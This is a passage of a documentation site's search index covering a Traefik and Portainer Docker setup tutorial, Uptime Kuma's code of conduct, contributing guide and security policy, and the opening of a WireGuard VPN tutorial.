\u251c\u2500\u2500 core/\n    \u2502   \u251c\u2500\u2500 traefik-data/\n    \u2502   \u2502   \u251c\u2500\u2500 configurations/\n    \u2502   \u2502   \u2502   \u2514\u2500\u2500 dynamic.yml\n    \u2502   \u2502   \u251c\u2500\u2500 traefik.yml\n    \u2502   \u2502   \u2514\u2500\u2500 acme.json\n    \u2502   \u2514\u2500\u2500 docker-compose.yml\n    \u2514\u2500\u2500 apps/\n</code></pre>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#file-explanation","title":"File explanation \u2705","text":""},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#i-traefikyml","title":"I. traefik.yml","text":"<p>The first file we will go over is the <code>traefik.yml</code> file as seen in the code snippet below. This is the static, base configuration of Traefik.</p> <p>First we tell Traefik that we want the Web GUI by setting <code>dashboard:true</code></p> <p>After that we define our two entrypoints <code>web</code> (http) and <code>websecure</code> (https). For our secure <code>https</code> endpoint we set-up the <code>certResolver</code> so we can enjoy automatic certifcates from Let\u2019s Encrypt! \ud83d\ude04 Next up we load the appropriate middleware so that all our traffic will be forwarded to <code>https</code>.</p> <p>In the <code>providers</code> part we specify that this file will be passed to a docker container using bind mount. We also tell Traefik to find our dynamic configuration in <code>configurations/dynamic.yml</code>. And at last is the configuration for our SSL certificate resolver.</p> <pre><code># traefik.yml\napi:\n  dashboard: true\n\nentryPoints:\n  web:\n    address: :80\n    http:\n      redirections:\n        entryPoint:\n          to: websecure\n\n  websecure:\n    address: :443\n    http:\n      middlewares:\n        - secureHeaders@file\n      tls:\n        certResolver: letsencrypt\n\nproviders:\n  docker:\n    endpoint: \"unix:///var/run/docker.sock\"\n    exposedByDefault: false\n  file:\n    filename: /configurations/dynamic.yml\n\ncertificatesResolvers:\n  letsencrypt:\n    acme:\n      email: raf@yourdomain.com\n      storage: acme.json\n      keyType: EC384\n      httpChallenge:\n        entryPoint: web\n</code></pre> <p>Note: Make sure to configure an email in this file for the Let\u2019s Encrypt renewal. @yourdomain.com might throw an error when you want to run your docker container!</p>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#ii-dynamicyml","title":"II. dynamic.yml","text":"<p>This file contains our middlewares to make sure all our traffic is fully secure and runs over TLS. We also set the basic auth here for our Traefik dashboard, because by default it is accessible for everyone.</p> <p>The file is fully dynamic and can be edited on the fly, without restarting our container.</p> <pre><code># dynamic.yml\nhttp:\n  middlewares:\n    secureHeaders:\n      headers:\n        sslRedirect: true\n        forceSTSHeader: true\n        stsIncludeSubdomains: true\n        stsPreload: true\n        stsSeconds: 31536000\n\n    user-auth:\n      basicAuth:\n        users:\n          - \"raf:$apr1$MTqfVwiE$FKkzT5ERGFqwH9f3uipxA1\"\n\ntls:\n  options:\n    default:\n      cipherSuites:\n        - TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384\n        - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384\n        - TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256\n        - TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256\n        - TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305\n      minVersion: VersionTLS12\n</code></pre>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#iii-docker-composeyml","title":"III. docker-compose.yml","text":"<p>The most important file. This is where the good stuff happens. So the beauty of Traefik is that once you have done the intial set-up, deploying new containers is very easy. It works by specifiying <code>labels</code> for your containers.</p> <pre><code># docker-compose.yml\nversion: \"3\"\n\nservices:\n  traefik:\n    image: traefik:latest\n    container_name: traefik\n    restart: unless-stopped\n    security_opt:\n      - no-new-privileges:true\n    networks:\n      - proxy\n    ports:\n      - 80:80\n      - 443:443\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n      - ./traefik-data/traefik.yml:/traefik.yml:ro\n      - ./traefik-data/acme.json:/acme.json\n      - ./traefik-data/configurations:/configurations\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.traefik-secure.entrypoints=websecure\"\n      - \"traefik.http.routers.traefik-secure.rule=Host(`traefik.yourdomain.com`)\"\n      - \"traefik.http.routers.traefik-secure.service=api@internal\"\n      - \"traefik.http.routers.traefik-secure.middlewares=user-auth@file\"\n\n  portainer:\n    image: portainer/portainer-ce:latest\n    container_name: portainer\n    restart: unless-stopped\n    security_opt:\n      - no-new-privileges:true\n    networks:\n      - proxy\n    volumes:\n      - /etc/localtime:/etc/localtime:ro\n      - /var/run/docker.sock:/var/run/docker.sock:ro\n      - ./portainer-data:/data\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.portainer-secure.entrypoints=websecure\"\n      - \"traefik.http.routers.portainer-secure.rule=Host(`portainer.yourdomain.com`)\"\n      - \"traefik.http.routers.portainer-secure.service=portainer\"\n      - \"traefik.http.services.portainer.loadbalancer.server.port=9000\"\n\nnetworks:\n  proxy:\n    external: true\n</code></pre> <p>For every container that you want Traefik to handle, you add labels so Traefik knows where it should route it. So when we look at the file above, let\u2019s quickly check what is going on at the <code>traefik</code> container.</p> <p>So we attach the first label, which tells Traefik that it should route this container because we specify <code>enable=true</code>. This is the result of the configuration in the static <code>traefik.yml</code> file where we explictly stated <code>exposedByDefault: false</code> so therefore we have to specify that.</p> <p>The second label tells us that we should use the network <code>proxy</code>, which we will create later on. After that we tell Traefik to use our <code>websecure</code> endpoint (https). We then specify our host name with the appropriate domain. \ud83d\udc4d</p> <p>The final to last label specifies the API handler. It exposes information such as the configuration of all routers, services, middlewares, etc. To see all the available endpoints you can check the docs.</p> <p>The very last label is our basic auth middleware, remember? Because the Traefik dashboard is exposed by default so we add a basic security layer over it. It will also protect our API.</p> <pre><code>labels:\n  - \"traefik.enable=true\"\n  - \"traefik.docker.network=proxy\"\n  - \"traefik.http.routers.traefik-secure.entrypoints=websecure\"\n  - \"traefik.http.routers.traefik-secure.rule=Host(`traefik.yourdomain.com`)\"\n  - \"traefik.http.routers.traefik-secure.service=api@internal\"\n  - \"traefik.http.routers.traefik-secure.middlewares=user-auth@file\"\n</code></pre>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#running-our-stack","title":"Running our stack \ud83d\ude80","text":""},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#i-creating-credentials","title":"I. Creating credentials","text":"<p>So the first thing we should do is generate the password for basic auth that will be stored in the <code>dynamic.yml</code> file. These credentials will be required when trying to log into our Traefik Web UI and it will protect the API.</p> <p>Make sure your server has <code>htpasswd</code> installed. If it doesn\u2019t you can do so with the following command:</p> <pre><code>$ sudo apt install apache-utils\n</code></pre> <p>Then run the below command, replacing the username and password with the one you want to use.</p> <pre><code>$ echo $(htpasswd -nb &lt;username&gt; &lt;password&gt;)\n</code></pre> <p>Edit the <code>dynamic.yml</code> file and add your auth string under the <code>user-auth</code> middleware as seen in the example code.</p>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#ii-creating-the-proxy-network","title":"II. Creating the proxy network","text":"<p>We need to create a new Docker network that will allow outside traffic. This should be called <code>proxy</code> as we specified in our <code>docker-compose.yml</code> file:</p> <pre><code>networks:\n  - proxy\n</code></pre> <p>To create a docker network use:</p> <pre><code>$ docker network create proxy\n</code></pre>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#iii-editing-the-domain-names","title":"III. Editing the domain names","text":"<p>Open the <code>docker-compose.yml</code> file and make sure you replace the domain values in the Traefik labels to the domains that you send to the server as done earlier:</p> <pre><code>traefik.yourdomain.com\nportainer.yourdomain.com\n</code></pre>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#iv-giving-the-proper-permissions-to-acmejson","title":"IV. Giving the proper permissions to acme.json","text":"<p>By default the file acme.json has the permission set to <code>644</code>, this will result in a error when running <code>docker-compose</code>. So make sure you set the permissions of that particular file to <code>600</code>. <code>cd</code> into the <code>core</code> folder and run the following command:</p> <pre><code>$ sudo chmod 600 ./traefik-config/acme.json\n</code></pre>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#v-running-the-stack","title":"V. Running the stack","text":"<p>Now it is time to run the stack. Make sure you are in the <code>core</code> folder so docker can find the docker-compose file. On the first run I always like to check the process for errors before we use the docker-compose <code>--detach</code> flag. Run the following command:</p> <pre><code>$ sudo docker-compose up\n</code></pre> <p>Right now the Traefik dashboard should be available at <code>traefik.yourdomain.com</code> and <code>portainer.yourdomain.com</code>, awesome! \ud83d\udd25</p> <p>When you are sure that your containers are running correctly, run them in the background by using the <code>--detach</code> option:</p> <pre><code>$ sudo docker-compose down &amp;&amp; sudo docker-compose up -d\n</code></pre>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#adding-docker-applications-to-our-server","title":"Adding docker applications to our server \ud83c\udfc6","text":"<p>Alright so our environment is all configured, let me show you now how easy it is to deploy containers to our new Traefik set-up.</p> <p>This is where the magic happens. It took me 2 minutes in total to find a dockerized app on the internet, deploy it and make it available to the world wide web. Can you believe that? TWO MINUTES! If all my deployments were that easy..</p> <p>Anyway, here are the steps I took.</p> <p>I pointed the domain I want to use for the app, to the server. For this example I used <code>express.domain.com</code>.</p> <p>After that I google\u2019d \u201cdocker express starter\u201d and I found a repo and forked it. Then on the server I switched to the <code>apps</code> folder and ran <code>git clone</code></p> <pre><code>$ git clone https://github.com/rafrasenberg/docker-express-postgres ./express\n</code></pre> <p>After that it was time to edit the <code>docker-compose.yml</code> file of our app:</p> <pre><code># docker-compose.yml (from the internet repo)\nversion: \"3\"\nservices:\n  app:\n    build: .\n    depends_on:\n      - postgres\n    environment:\n      DATABASE_URL: postgres://user:pass@postgres:5432/db\n      NODE_ENV: development\n      PORT: 3000\n    ports:\n      - \"3000:3000\"\n    command: npm run dev\n    volumes:\n      - .:/app/\n      - /app/node_modules\n\n  postgres:\n    image: postgres:10.4\n    ports:\n      - \"35432:5432\"\n    environment:\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: pass\n      POSTGRES_DB: db\n</code></pre> <p>Now you might be wondering, how should I approach this? The first thing we do is remove the <code>ports</code> section, as Traefik will take care of this. For the whole Traefik config we only have to add 4 labels:</p> <pre><code>labels:\n  - \"traefik.enable=true\"\n  - \"traefik.docker.network=proxy\"\n  - \"traefik.http.routers.app-secure.entrypoints=websecure\"\n  - \"traefik.http.routers.app-secure.rule=Host(`express.yourdomain.com`)\"\n</code></pre> <p>So what is happening here?</p> <p>First we enable this container with <code>enable=true</code>, then we add it to the <code>proxy</code> network. After that we specify the routers and the entrypoints.</p> <p>Note that this part: <code>traefik.http.router.app-secure</code> should have an unique router identification. So make sure you haven\u2019t used that name yet. Let\u2019s say you want to deploy the exact same app on a different domain and container instance, you could use this label: <code>traefik.http.router.app1-secure</code>. Just make sure it\u2019s an unique value.</p> <p>Now the last part that we need to do in the <code>docker-compose.yml</code> file is specifiying the networks. So the final <code>docker-compose.yml</code> file will look like this:</p> <pre><code># docker-compose.yml\nversion: \"3\"\nservices:\n  app:\n    build: .\n    depends_on:\n      - postgres\n    environment:\n      DATABASE_URL: postgres://user:pass@postgres:5432/db\n      NODE_ENV: development\n      PORT: 3000\n    command: npm run dev\n    volumes:\n      - .:/app/\n      - /app/node_modules\n    networks:\n      - proxy\n      - default\n    labels:\n      - \"traefik.enable=true\"\n      - \"traefik.docker.network=proxy\"\n      - \"traefik.http.routers.app-secure.entrypoints=websecure\"\n      - \"traefik.http.routers.app-secure.rule=Host(`express.rasenberg.tech`)\"\n  postgres:\n    image: postgres:10.4\n    ports:\n      - \"35432:5432\"\n    environment:\n      POSTGRES_USER: user\n      POSTGRES_PASSWORD: pass\n      POSTGRES_DB: db\n\nnetworks:\n  proxy:\n    external: true\n</code></pre> <p>Now let\u2019s run our container:</p> <pre><code>$ sudo docker-compose up -d\n</code></pre> <p>That\u2019s all! We literally only added less than 10 lines to our <code>docker-compose.yml</code> file and our container is deployed and ready to receive traffic. Awesome right! \ud83d\udc4f</p> <p>Now our new app is also showing up in Portainer:</p> <p></p> <p>Now whenever you want to add a new applications on your server, just repeat the last few steps. Easy as that! \ud83d\ude80</p>"},{"location":"Traefic/docker-traefik-portainer/TUTORIAL/#conclusion","title":"Conclusion \u26a1\ufe0f","text":"<p>Let\u2019s recap this.</p> <p>We have set-up an awesome configuration stack for running and managing multiple docker containers on one server. Deploying new projects will be very easy after this intial set-up.</p> <p>Something I want to cover in the next post is integrating a basic CI pipeline that connects with our droplet so we can automatically update our containers on a code push to Github. So stay tuned for that!</p> <p>See you next time! \ud83d\udc4b</p>"},{"location":"Traefic/docker-traefik-portainer/apps/","title":"Apps","text":"<p>The folder for your apps</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/","title":"Contributor Covenant Code of Conduct","text":""},{"location":"UptimeKuma/CODE_OF_CONDUCT/#our-pledge","title":"Our Pledge","text":"<p>We as members, contributors, and leaders pledge to make participation in our community a harassment-free experience for everyone, regardless of age, body size, visible or invisible disability, ethnicity, sex characteristics, gender identity and expression, level of experience, education, socio-economic status, nationality, personal appearance, race, religion, or sexual identity and orientation.</p> <p>We pledge to act and interact in ways that contribute to an open, welcoming, diverse, inclusive, and healthy community.</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#our-standards","title":"Our Standards","text":"<p>Examples of behavior that contributes to a positive environment for our community include:</p> <ul> <li>Demonstrating empathy and kindness toward other people</li> <li>Being respectful of differing opinions, viewpoints, and experiences</li> <li>Giving and gracefully accepting constructive feedback</li> <li>Accepting responsibility and apologizing to those affected by our mistakes,   and learning from the experience</li> <li>Focusing on what is best not just for us as individuals, but for the   overall community</li> </ul> <p>Examples of unacceptable behavior include:</p> <ul> <li>The use of sexualized language or imagery, and sexual attention or   advances of any kind</li> <li>Trolling, insulting or derogatory comments, and personal or political attacks</li> <li>Public or private harassment</li> <li>Publishing others' private information, such as a physical or email   address, without their explicit permission</li> <li>Other conduct which could reasonably be considered inappropriate in a   professional setting</li> </ul>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#enforcement-responsibilities","title":"Enforcement Responsibilities","text":"<p>Community leaders are responsible for clarifying and enforcing our standards of acceptable behavior and will take appropriate and fair corrective action in response to any behavior that they deem inappropriate, threatening, offensive, or harmful.</p> <p>Community leaders have the right and responsibility to remove, edit, or reject comments, commits, code, wiki edits, issues, and other contributions that are not aligned to this Code of Conduct, and will communicate reasons for moderation decisions when appropriate.</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#scope","title":"Scope","text":"<p>This Code of Conduct applies within all community spaces, and also applies when an individual is officially representing the community in public spaces. Examples of representing our community include using an official e-mail address, posting via an official social media account, or acting as an appointed representative at an online or offline event.</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#enforcement","title":"Enforcement","text":"<p>Instances of abusive, harassing, or otherwise unacceptable behavior may be reported to the community leaders responsible for enforcement at uptime@kuma.pet. All complaints will be reviewed and investigated promptly and fairly.</p> <p>All community leaders are obligated to respect the privacy and security of the reporter of any incident.</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#enforcement-guidelines","title":"Enforcement Guidelines","text":"<p>Community leaders will follow these Community Impact Guidelines in determining the consequences for any action they deem in violation of this Code of Conduct:</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#1-correction","title":"1. Correction","text":"<p>Community Impact: Use of inappropriate language or other behavior deemed unprofessional or unwelcome in the community.</p> <p>Consequence: A private, written warning from community leaders, providing clarity around the nature of the violation and an explanation of why the behavior was inappropriate. A public apology may be requested.</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#2-warning","title":"2. Warning","text":"<p>Community Impact: A violation through a single incident or series of actions.</p> <p>Consequence: A warning with consequences for continued behavior. No interaction with the people involved, including unsolicited interaction with those enforcing the Code of Conduct, for a specified period of time. This includes avoiding interactions in community spaces as well as external channels like social media. Violating these terms may lead to a temporary or permanent ban.</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#3-temporary-ban","title":"3. Temporary Ban","text":"<p>Community Impact: A serious violation of community standards, including sustained inappropriate behavior.</p> <p>Consequence: A temporary ban from any sort of interaction or public communication with the community for a specified period of time. No public or private interaction with the people involved, including unsolicited interaction with those enforcing the Code of Conduct, is allowed during this period. Violating these terms may lead to a permanent ban.</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#4-permanent-ban","title":"4. Permanent Ban","text":"<p>Community Impact: Demonstrating a pattern of violation of community standards, including sustained inappropriate behavior, harassment of an individual, or aggression toward or disparagement of classes of individuals.</p> <p>Consequence: A permanent ban from any sort of public interaction within the community.</p>"},{"location":"UptimeKuma/CODE_OF_CONDUCT/#attribution","title":"Attribution","text":"<p>This Code of Conduct is adapted from the Contributor Covenant, version 2.0, available at https://www.contributor-covenant.org/version/2/0/code_of_conduct.html.</p> <p>Community Impact Guidelines were inspired by Mozilla's code of conduct enforcement ladder.</p> <p>For answers to common questions about this code of conduct, see the FAQ at https://www.contributor-covenant.org/faq. Translations are available at https://www.contributor-covenant.org/translations.</p>"},{"location":"UptimeKuma/CONTRIBUTING/","title":"Project Info","text":"<p>First of all, I want to thank everyone who made pull requests for Uptime Kuma. I never thought the GitHub Community would be so nice! Because of this, I also never thought that other people would actually read and edit my code. It is not very well structured or commented, sorry about that.</p> <p>The project was created with vite.js (vue3). Then I created a subdirectory called \"server\" for server part. Both frontend and backend share the same package.json.</p> <p>The frontend code build into \"dist\" directory. The server (express.js) exposes the \"dist\" directory as root of the endpoint. This is how production is working.</p>"},{"location":"UptimeKuma/CONTRIBUTING/#key-technical-skills","title":"Key Technical Skills","text":"<ul> <li>Node.js (You should know what are promise, async/await and arrow function etc.)</li> <li>Socket.io</li> <li>SCSS</li> <li>Vue.js</li> <li>Bootstrap</li> <li>SQLite</li> </ul>"},{"location":"UptimeKuma/CONTRIBUTING/#directories","title":"Directories","text":"<ul> <li>config (dev config files)</li> <li>data (App data)</li> <li>db (Base database and migration scripts)</li> <li>dist (Frontend build)</li> <li>docker (Dockerfiles)</li> <li>extra (Extra useful scripts)</li> <li>public (Frontend resources for dev only)</li> <li>server (Server source code)</li> <li>src (Frontend source code)</li> <li>test (unit test)</li> </ul>"},{"location":"UptimeKuma/CONTRIBUTING/#can-i-create-a-pull-request-for-uptime-kuma","title":"Can I create a pull request for Uptime Kuma?","text":"<p>Yes or no, it depends on what you will try to do. Since I don't want to waste your time, be sure to create an empty draft pull request or open an issue, so we can have a discussion first. Especially for a large pull request or you don't know it will be merged or not.</p> <p>Here are some references:</p> <p>\u2705 Usually Accept: - Bug fix - Security fix - Adding notification providers - Adding new language files (You should go to https://weblate.kuma.pet for existing languages) - Adding new language keys: <code>$t(\"...\")</code></p> <p>\u26a0\ufe0f Discussion First - Large pull requests - New features</p> <p>\u274c Won't Merge - A dedicated pr for translating existing languages (You can now translate on https://weblate.kuma.pet)  - Do not pass the auto test - Any breaking changes - Duplicated pull requests - Buggy - UI/UX is not close to Uptime Kuma  - Modifications or deletions of existing logic without a valid reason. - Adding functions that is completely out of scope - Converting existing code into other programming languages - Unnecessarily large code changes that are hard to review and cause conflicts with other PRs.</p> <p>The above cases may not cover all possible situations.</p> <p>I (@louislam) have the final say. If your pull request does not meet my expectations, I will reject it, no matter how much time you spend on it. Therefore, it is essential to have a discussion beforehand.</p> <p>I will mark your pull request in the milestones, if I am plan to review and merge it.</p> <p>Also, please don't rush or ask for ETA, because I have to understand the pull request, make sure it is no breaking changes and stick to my vision of this project, especially for large pull requests.</p>"},{"location":"UptimeKuma/CONTRIBUTING/#recommended-pull-request-guideline","title":"Recommended Pull Request Guideline","text":"<p>Before deep into coding, discussion first is preferred. Creating an empty pull request for discussion would be recommended.</p> <ol> <li>Fork the project</li> <li>Clone your fork repo to local</li> <li>Create a new branch</li> <li>Create an empty commit    <code>git commit -m \"[empty commit] pull request for &lt;YOUR TASK NAME&gt;\" --allow-empty</code></li> <li>Push to your fork repo</li> <li>Create a pull request: https://github.com/louislam/uptime-kuma/compare</li> <li>Write a proper description</li> <li>Click \"Change to draft\"</li> <li>Discussion</li> </ol>"},{"location":"UptimeKuma/CONTRIBUTING/#project-styles","title":"Project Styles","text":"<p>I personally do not like something that requires so many configurations before you can finally start the app. I hope Uptime Kuma installation could be as easy as like installing a mobile app.</p> <ul> <li>Easy to install for non-Docker users, no native build dependency is needed (for x86_64/armv7/arm64), no extra config, no extra effort required to get it running</li> <li>Single container for Docker users, no very complex docker-compose file. Just map the volume and expose the port, then good to go</li> <li>Settings should be configurable in the frontend. Environment variable is not encouraged, unless it is related to startup such as <code>DATA_DIR</code></li> <li>Easy to use</li> <li>The web UI styling should be consistent and nice</li> </ul>"},{"location":"UptimeKuma/CONTRIBUTING/#coding-styles","title":"Coding Styles","text":"<ul> <li>4 spaces indentation</li> <li>Follow <code>.editorconfig</code></li> <li>Follow ESLint</li> <li>Methods and functions should be documented with JSDoc</li> </ul>"},{"location":"UptimeKuma/CONTRIBUTING/#name-conventions","title":"Name Conventions","text":"<ul> <li>Javascript/Typescript: camelCaseType</li> <li>SQLite: snake_case (Underscore)</li> <li>CSS/SCSS: kebab-case (Dash)</li> </ul>"},{"location":"UptimeKuma/CONTRIBUTING/#tools","title":"Tools","text":"<ul> <li>Node.js &gt;= 14</li> <li>NPM &gt;= 8.5</li> <li>Git</li> <li>IDE that supports ESLint and EditorConfig (I am using IntelliJ IDEA)</li> <li>A SQLite GUI tool (SQLite Expert Personal is suggested)</li> </ul>"},{"location":"UptimeKuma/CONTRIBUTING/#install-dependencies-for-development","title":"Install Dependencies for Development","text":"<pre><code>npm ci\n</code></pre>"},{"location":"UptimeKuma/CONTRIBUTING/#dev-server","title":"Dev Server","text":"<p>(2022-04-26 Update)</p> <p>We can start the frontend dev server and the backend dev server in one command.</p> <p>Port <code>3000</code> and port <code>3001</code> will be used.</p> <pre><code>npm run dev\n</code></pre> <p>But sometimes, you would like to keep restart the server, but not the frontend, you can run these command in two terminals:</p> <pre><code>npm run start-frontend-dev\nnpm run start-server-dev\n</code></pre>"},{"location":"UptimeKuma/CONTRIBUTING/#backend-server","title":"Backend Server","text":"<p>It binds to <code>0.0.0.0:3001</code> by default.</p> <p>It is mainly a socket.io app + express.js.</p> <p>express.js is used for:  - entry point such as redirecting to a status page or the dashboard - serving the frontend built files (index.html, .js and .css etc.) - serving internal APIs of status page</p>"},{"location":"UptimeKuma/CONTRIBUTING/#structure-in-server","title":"Structure in /server/","text":"<ul> <li>jobs/ (Jobs that are running in another process)</li> <li>model/ (Object model, auto mapping to the database table name)</li> <li>modules/ (Modified 3rd-party modules)</li> <li>monitor_types (Monitor Types)</li> <li>notification-providers/ (individual notification logic)</li> <li>routers/ (Express Routers)</li> <li>socket-handler (Socket.io Handlers)</li> <li>server.js (Server entry point)</li> <li>uptime-kuma-server.js (UptimeKumaServer class, main logic should be here, but some still in <code>server.js</code>)</li> </ul>"},{"location":"UptimeKuma/CONTRIBUTING/#frontend-dev-server","title":"Frontend Dev Server","text":"<p>It binds to <code>0.0.0.0:3000</code> by default. Frontend dev server is used for development only. </p> <p>For production, it is not used. It will be compiled to <code>dist</code> directory instead. </p> <p>You can use Vue.js devtools Chrome extension for debugging.</p>"},{"location":"UptimeKuma/CONTRIBUTING/#build-the-frontend","title":"Build the frontend","text":"<pre><code>npm run build\n</code></pre>"},{"location":"UptimeKuma/CONTRIBUTING/#frontend-details","title":"Frontend Details","text":"<p>Uptime Kuma Frontend is a single page application (SPA). Most paths are handled by Vue Router.</p> <p>The router is in <code>src/router.js</code></p> <p>As you can see, most data in frontend is stored in root level, even though you changed the current router to any other pages.</p> <p>The data and socket logic are in <code>src/mixins/socket.js</code>.</p>"},{"location":"UptimeKuma/CONTRIBUTING/#database-migration","title":"Database Migration","text":"<ol> <li>Create <code>patch-{name}.sql</code> in <code>./db/</code></li> <li>Add your patch filename in the <code>patchList</code> list in <code>./server/database.js</code></li> </ol>"},{"location":"UptimeKuma/CONTRIBUTING/#unit-test","title":"Unit Test","text":"<pre><code>npm run build\nnpm test\n</code></pre>"},{"location":"UptimeKuma/CONTRIBUTING/#dependencies","title":"Dependencies","text":"<p>Both frontend and backend share the same package.json. However, the frontend dependencies are eventually not used in the production environment, because it is usually also baked into dist files. So:</p> <ul> <li>Frontend dependencies = \"devDependencies\"</li> <li>Examples: vue, chart.js</li> <li>Backend dependencies = \"dependencies\"</li> <li>Examples: socket.io, sqlite3</li> <li>Development dependencies = \"devDependencies\"</li> <li>Examples: eslint, sass</li> </ul>"},{"location":"UptimeKuma/CONTRIBUTING/#update-dependencies","title":"Update Dependencies","text":"<p>Since previously updating Vite 2.5.10 to 2.6.0 broke the application completely, from now on, it should update patch release version only.</p> <p>Patch release = the third digit (Semantic Versioning)</p> <p>If for maybe security reasons, a library must be updated. Then you must need to check if there are any breaking changes.</p>"},{"location":"UptimeKuma/CONTRIBUTING/#translations","title":"Translations","text":"<p>Please read: https://github.com/louislam/uptime-kuma/tree/master/src/languages</p>"},{"location":"UptimeKuma/CONTRIBUTING/#wiki","title":"Wiki","text":"<p>Since there is no way to make a pull request to wiki's repo, I have set up another repo to do that.</p> <p>https://github.com/louislam/uptime-kuma-wiki</p>"},{"location":"UptimeKuma/CONTRIBUTING/#maintainer","title":"Maintainer","text":"<p>Check the latest issues and pull requests: https://github.com/louislam/uptime-kuma/issues?q=sort%3Aupdated-desc</p>"},{"location":"UptimeKuma/CONTRIBUTING/#release-procedures","title":"Release Procedures","text":"<ol> <li>Draft a release note</li> <li>Make sure the repo is cleared</li> <li>If the healthcheck is updated, remember to re-compile it: <code>npm run build-docker-builder-go</code></li> <li><code>npm run release-final with env vars:</code>VERSION<code>and</code>GITHUB_TOKEN`</li> <li>Wait until the <code>Press any key to continue</code></li> <li><code>git push</code></li> <li>Publish the release note as 1.X.X </li> <li>Press any key to continue</li> <li>Deploy to the demo server: <code>npm run deploy-demo-server</code></li> </ol> <p>Checking:</p> <ul> <li>Check all tags is fine on https://hub.docker.com/r/louislam/uptime-kuma/tags</li> <li>Try the Docker image with tag 1.X.X (Clean install / amd64 / arm64 / armv7)</li> <li>Try clean installation with Node.js</li> </ul>"},{"location":"UptimeKuma/CONTRIBUTING/#release-beta-procedures","title":"Release Beta Procedures","text":"<ol> <li>Draft a release note, check \"This is a pre-release\"</li> <li>Make sure the repo is cleared</li> <li><code>npm run release-beta</code> with env vars: <code>VERSION</code> and <code>GITHUB_TOKEN</code></li> <li>Wait until the <code>Press any key to continue</code></li> <li>Publish the release note as 1.X.X-beta.X</li> <li>Press any key to continue</li> </ol>"},{"location":"UptimeKuma/CONTRIBUTING/#release-wiki","title":"Release Wiki","text":""},{"location":"UptimeKuma/CONTRIBUTING/#setup-repo","title":"Setup Repo","text":"<pre><code>git clone https://github.com/louislam/uptime-kuma-wiki.git\ncd uptime-kuma-wiki\ngit remote add production https://github.com/louislam/uptime-kuma.wiki.git\n</code></pre>"},{"location":"UptimeKuma/CONTRIBUTING/#push-to-production-wiki","title":"Push to Production Wiki","text":"<pre><code>git pull\ngit push production master\n</code></pre>"},{"location":"UptimeKuma/SECURITY/","title":"Security Policy","text":""},{"location":"UptimeKuma/SECURITY/#reporting-a-vulnerability","title":"Reporting a Vulnerability","text":"<ol> <li>Please report security issues to https://github.com/louislam/uptime-kuma/security/advisories/new.</li> <li>Please also create a empty security issues for alerting me, as GitHub Advisory do not send a notification, I probably will miss without this. https://github.com/louislam/uptime-kuma/issues/new?assignees=&amp;labels=help&amp;template=security.md</li> </ol> <p>Do not use the public issue tracker or discuss it in the public as it will cause more damage.</p>"},{"location":"UptimeKuma/SECURITY/#do-you-accept-other-3rd-party-bug-bounty-platforms","title":"Do you accept other 3rd-party bug bounty platforms?","text":"<p>At this moment, I DO NOT accept other bug bounty platforms, because I am not familiar with these platforms and someone have tried to send a phishing link to me by this already. To minimize my own risk, please report through GitHub Advisories only. I will ignore all 3rd-party bug bounty platforms emails.</p>"},{"location":"UptimeKuma/SECURITY/#supported-versions","title":"Supported Versions","text":""},{"location":"UptimeKuma/SECURITY/#uptime-kuma-versions","title":"Uptime Kuma Versions","text":"<p>You should use or upgrade to the latest version of Uptime Kuma. All <code>1.X.X</code> versions are upgradable to the lastest version.</p>"},{"location":"UptimeKuma/SECURITY/#upgradable-docker-tags","title":"Upgradable Docker Tags","text":"Tag Supported 1 1-debian latest debian 1-alpine \u26a0\ufe0f Deprecated alpine \u26a0\ufe0f Deprecated All other tags \u274c"},{"location":"UptimeKuma/src/lang/","title":"How to translate","text":"<p>(2023-01-24 Updated)</p> <ol> <li>Go to https://weblate.kuma.pet</li> <li>Register an account on Weblate</li> <li>Make sure your GitHub email is matched with Weblate's account, so that it could show you as a contributor on GitHub</li> <li>Choose your language on Weblate and start translating.</li> </ol>"},{"location":"UptimeKuma/src/lang/#how-to-add-a-new-language-in-the-dropdown","title":"How to add a new language in the dropdown","text":"<ol> <li>Add your language at https://weblate.kuma.pet/projects/uptime-kuma/uptime-kuma/</li> <li>Find the language code (You can find it at the end of the URL)</li> <li>Go to https://github.com/louislam/uptime-kuma/blob/master/src/i18n.js and click <code>Edit</code> icon</li> <li>Add your language at the end of <code>languageList</code>, format: <code>\"zh-TW\": \"\u7e41\u9ad4\u4e2d\u6587 (\u53f0\u7063)\",</code></li> <li>Commit and make a pull request for me to approve</li> </ol> <p>If you do not have programming skills, let me know in the issues section. I will assist you. \ud83d\ude0f</p>"},{"location":"VPN/Tutorial/","title":"Tutorial","text":"<p>WireGuard is a modern VPN (Virtual Private Network) technology that utilizes state-of-the-art cryptography. Compared to other popular VPN solutions, such as IPsec and OpenVPN , WireGuard is faster, easier to configure, and has a smaller 